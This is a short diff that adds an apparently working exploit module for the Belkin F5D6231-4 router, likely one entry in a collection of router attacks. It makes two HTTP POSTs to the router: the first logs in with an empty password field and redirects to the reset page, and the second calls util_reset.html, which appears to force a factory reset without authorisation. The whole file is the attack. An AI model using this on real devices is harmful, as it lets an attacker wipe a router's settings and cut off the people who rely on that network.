@@ -1,0 +1,15 @@
+"""
+Belkin&nbsp;F5D6231-4
+"""
+
+vendor = 'Belkin'
+name = 'Belkin&nbsp;F5D6231-4'
+regex = r''
+
+# step #1
+data = u'page=login&goto=%2Futil_reset.html&pws='
+post('http://{routerip}/login.html', data=data)
+
+# step #2
+post('http://{routerip}/util_reset.html')
+
